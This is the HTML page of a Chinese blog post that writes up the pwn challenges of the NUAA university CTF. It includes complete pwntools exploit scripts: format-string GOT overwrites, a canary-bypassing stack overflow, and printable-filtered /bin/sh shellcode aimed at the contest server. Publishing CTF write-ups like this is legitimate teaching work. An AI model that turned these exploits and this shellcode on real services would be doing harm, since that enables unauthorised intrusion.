@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="google-site-verification" content="McPiO5BdY1yB87an5v8Lw035aZiGKuLkg736kSbzD_k" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Logo font:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"as1def.github.io","root":"/","scheme":"Gemini","version":"8.0.0-rc.2","exturl":false,"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":9},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="做了一下南航的校赛，题目相对来说是比较友好的，这里总结一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NUAACTF">
+<meta property="og:url" content="https://as1def.github.io/2020/06/01/NUAACTF/index.html">
+<meta property="og:site_name" content="As1def&#39;s Blog">
+<meta property="og:description" content="做了一下南航的校赛，题目相对来说是比较友好的，这里总结一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-06-01T11:19:13.000Z">
+<meta property="article:modified_time" content="2020-06-01T12:10:20.353Z">
+<meta property="article:author" content="As1def">
+<meta property="article:tag" content="NUAA pwn">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://as1def.github.io/2020/06/01/NUAACTF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>NUAACTF | As1def's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="As1def's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	
+	
+	<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+	
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line toggle-line-first"></span>
+        <span class="toggle-line toggle-line-middle"></span>
+        <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">As1def's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://as1def.github.io/2020/06/01/NUAACTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="As1def">
+      <meta itemprop="description" content="听懂了一首歌,生活中回响着旋律">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="As1def's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NUAACTF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-06-01 19:19:13 / 修改时间：20:10:20" itemprop="dateCreated datePublished" datetime="2020-06-01T19:19:13+08:00">2020-06-01</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>做了一下南航的校赛，题目相对来说是比较友好的，这里总结一下</p>
+<a id="more"></a>
+
+<p><a href="https://github.com/As1def/ctf-challenges/tree/master/pwn/NUAACTF" target="_blank" rel="noopener">题目附件及exp</a></p>
+<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>签到题，nc连上就可以读取flag。</p>
+<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>格式化字符串，直接写got表为one_gadget.</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./main'</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(binary)</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">"49.235.243.206"</span>,<span class="number">10502</span>)</span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> data :io.sendline(data)</span><br><span class="line">ru=<span class="keyword">lambda</span> data,drop=<span class="literal">True</span> :io.recvuntil(data,drop)</span><br><span class="line">rv=<span class="keyword">lambda</span> data :io.recv(data)</span><br><span class="line">rl=<span class="keyword">lambda</span> data :io.recvline(data)</span><br><span class="line">leak=<span class="keyword">lambda</span> data,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(data, addr))</span><br><span class="line">irt=<span class="keyword">lambda</span>  :io.interactive()</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%33$p'</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">'0x'</span>)</span><br><span class="line">libc_base=int(rv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-0x7B947</span></span><br><span class="line">leak(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line"></span><br><span class="line">one_addr=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=libc_base+one_addr[<span class="number">2</span>]</span><br><span class="line">payload = <span class="string">'%'</span> </span><br><span class="line">payload += str((one_gadget &amp; <span class="number">0xffff</span> ) - <span class="number">5</span>) </span><br><span class="line">payload += <span class="string">'c'</span>+<span class="string">'aaaaa%12$hn'</span>+<span class="string">'%'</span>+str(((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) + <span class="number">0xb7</span>) </span><br><span class="line">payload += <span class="string">'c'</span>+<span class="string">'aa%13$hhn'</span> </span><br><span class="line">payload += p64(read_got) </span><br><span class="line">payload += p64(read_got + <span class="number">2</span>) </span><br><span class="line">sl(payload)</span><br><span class="line">irt()</span><br><span class="line"><span class="comment">#flag&#123;7221CB4A535A0F5E4C47F5FEEC64C952&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>一个栈溢出，改v2为0x40绕过canary。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./main'</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(binary)</span></span><br><span class="line">io=remote(<span class="string">"49.235.243.206"</span>,<span class="number">10503</span>)</span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> x :io.sendline(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x :io.recvuntil(x,drop)</span><br><span class="line">irt=<span class="keyword">lambda</span>  :io.interactive()</span><br><span class="line"></span><br><span class="line">system_addr=<span class="number">0x4007FB</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x40</span>)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">irt()</span><br><span class="line"><span class="comment">#flag&#123;E291A9922B72C69900DC4D0BB1E29BDE&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p>house of lore，这题先放着。。</p>
+<h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>全局变量的格式化字符串，通过写栈地址(read_got)达成跳板，同样改写got表即可。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./main'</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(binary)</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">'49.235.243.206'</span>,<span class="number">10505</span>)</span><br><span class="line">sl=<span class="keyword">lambda</span> x :io.sendline(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x :io.recvuntil(x,drop)</span><br><span class="line">irt=<span class="keyword">lambda</span>  :io.interactive()</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(io) </span></span><br><span class="line"><span class="comment">#payload = '%p,'*10 </span></span><br><span class="line">payload = <span class="string">'%11$p,'</span> </span><br><span class="line">sl(payload) </span><br><span class="line">libc_base = int(ru(<span class="string">','</span>)[:<span class="number">-1</span>],<span class="number">16</span>) - <span class="number">0x20830</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1147</span> </span><br><span class="line">log.success(<span class="string">'libc_base =&gt; '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%'</span> </span><br><span class="line">payload += str(read_got)</span><br><span class="line">payload += <span class="string">'c'</span> </span><br><span class="line">payload += <span class="string">'%8$lln;'</span> </span><br><span class="line">sl(payload) </span><br><span class="line">ru(<span class="string">';'</span>) </span><br><span class="line">payload = <span class="string">'%'</span>+str(read_got + <span class="number">2</span>)+<span class="string">'c'</span>+<span class="string">'%19$lln;'</span> </span><br><span class="line">sl(payload) </span><br><span class="line">ru(<span class="string">';'</span>) </span><br><span class="line">payload = <span class="string">'%'</span>+str(one_gadget &amp; <span class="number">0xffff</span>)+<span class="string">'c'</span>+<span class="string">'%10$hn'</span> </span><br><span class="line">payload += <span class="string">'%'</span>+str(((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) + <span class="number">0xb9</span>)+<span class="string">'c'</span>+<span class="string">'%38$hhn'</span> </span><br><span class="line">sl(payload) </span><br><span class="line">irt()</span><br><span class="line"><span class="comment">#flag&#123;3DD8600C697604883D8FF17048A6AF37&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h2><p>这题有点难搞，后来看了其他大佬的思路才知道，其实这是一个写一段汇编从而绕过字符的范围判断，一开始让字符位于可见字符范围内,然后在汇编里面进行单字节修改到想要的字符串。<a href="http://39.96.31.211/2020/05/30/Competition/NUAACTF/" target="_blank" rel="noopener">参考FMYY</a></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./pwn')</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'49.235.243.206'</span>, <span class="number">10506</span>)</span><br><span class="line"></span><br><span class="line">shell = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">push 0x70</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">sub byte ptr [rsi + 0x22], dl</span></span><br><span class="line"><span class="string">sub byte ptr [rsi + 0x2A], dl</span></span><br><span class="line"><span class="string">sub byte ptr [rsi + 0x2E], dl</span></span><br><span class="line"><span class="string">sub byte ptr [rsi + 0x2F], dl</span></span><br><span class="line"><span class="string">sub byte ptr [rsi + 0x45], dl</span></span><br><span class="line"><span class="string">sub byte ptr [rsi + 0x45], dl</span></span><br><span class="line"><span class="string">sub byte ptr [rsi + 0x45], dl</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">shell += <span class="string">"\x48\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x70"</span></span><br><span class="line">shell += asm(<span class="string">"""</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">"""</span>)	</span><br><span class="line"></span><br><span class="line">shell += <span class="string">"\x7F\x75"</span> <span class="comment">#syscall</span></span><br><span class="line"></span><br><span class="line">p.send(shell)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;A1191C435648EFFC09A90A8A113117A3&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+
+    </div>
+
+    
+    
+    
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------本文结束<i class="fa fa-heart"></i>感谢阅读----------------</div>
+    
+</div>
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/NUAA-pwn/" rel="tag"><i class="fa fa-tag"></i> NUAA pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/27/PWN%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="prev" title="PWN刷题记录">
+      <i class="fa fa-chevron-left"></i> PWN刷题记录
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/06/20/CVE-2017-13089-wget%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="next" title="CVE-2017-13089 wget栈溢出">
+      CVE-2017-13089 wget栈溢出 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1"><span class="nav-number">1.</span> <span class="nav-text">pwn1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn2"><span class="nav-number">2.</span> <span class="nav-text">pwn2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn3"><span class="nav-number">3.</span> <span class="nav-text">pwn3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn4"><span class="nav-number">4.</span> <span class="nav-text">pwn4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn5"><span class="nav-number">5.</span> <span class="nav-text">pwn5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn6"><span class="nav-number">6.</span> <span class="nav-text">pwn6</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="As1def"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">As1def</p>
+  <div class="site-description" itemprop="description">听懂了一首歌,生活中回响着旋律</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/As1def" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;As1def" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:why.asldef@qq.com" title="E-Mail → mailto:why.asldef@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://plus.google.com/As1def" title="Google → https:&#x2F;&#x2F;plus.google.com&#x2F;As1def" rel="noopener" target="_blank"><i class="fab fa-google fa-fw"></i>Google</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/brianchen2006" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;brianchen2006" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa ||fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">As1def</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">147k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:13</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i>
+<span id="busuanzi_container_site_uv">
+本站总访客数:<span id="busuanzi_value_site_uv"></span>&nbsp;&nbsp;| 
+</span>
+<span id="busuanzi_container_site_pv">
+  &nbsp;本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
